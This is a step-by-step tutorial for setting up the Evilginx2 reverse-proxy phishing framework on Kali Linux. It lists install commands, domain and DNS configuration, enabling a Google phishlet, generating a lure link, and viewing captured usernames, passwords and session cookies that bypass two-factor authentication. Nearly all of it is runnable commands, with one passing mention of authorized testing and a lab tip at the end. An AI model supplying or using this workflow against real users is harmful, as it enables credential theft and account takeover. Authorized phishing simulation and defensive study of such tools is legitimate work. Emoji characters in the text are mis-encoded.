Step-by-Step: Using Evilginx2 in Kali Linux
1Ô∏è‚É£ Install Dependencies

First, make sure your system is up to date and has Go installed:

sudo apt update && sudo apt upgrade -y
sudo apt install git make gcc -y
sudo apt install golang -y

2Ô∏è‚É£ Download & Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo make install


After installation, you can run:

evilginx

3Ô∏è‚É£ Configure a Domain

Evilginx2 works by creating phishing pages under your own domain name.
You need:

A registered domain (e.g., example.com)

A VPS or server with a public IP

DNS A records pointing subdomains to your server

Example DNS records:

phish.example.com  ‚Üí  your_server_IP
www.example.com    ‚Üí  your_server_IP

4Ô∏è‚É£ Set Up Evilginx2

Inside Evilginx2:

config domain phish.example.com
config ip your_server_IP


Enable HTTP to HTTPS redirection:

config redirect_https true

5Ô∏è‚É£ Install Phishlets

Phishlets are templates for specific sites (e.g., Google, Facebook, Office365):

phishlets
phishlets enable google


To view available phishlets in your Evilginx2 setup:

phishlets get-hosts google


Update your DNS records according to the required hostnames.

6Ô∏è‚É£ Start the Lure (Phishing Link)
lures create google
lures get-url 0


This URL is the phishing link you send only in an authorized test.

7Ô∏è‚É£ Capture Sessions

Once the target logs in through the phishing page, Evilginx2 will store:

Username

Password

Session cookies (for bypassing 2FA)

View captured data:

sessions

8Ô∏è‚É£ Stop & Exit

When done:

exit


üí° Tip for Testing in a Lab
If you don‚Äôt want to buy a domain, you can simulate Evilginx2 on a local network using /etc/hosts file redirection and self-signed certificates.
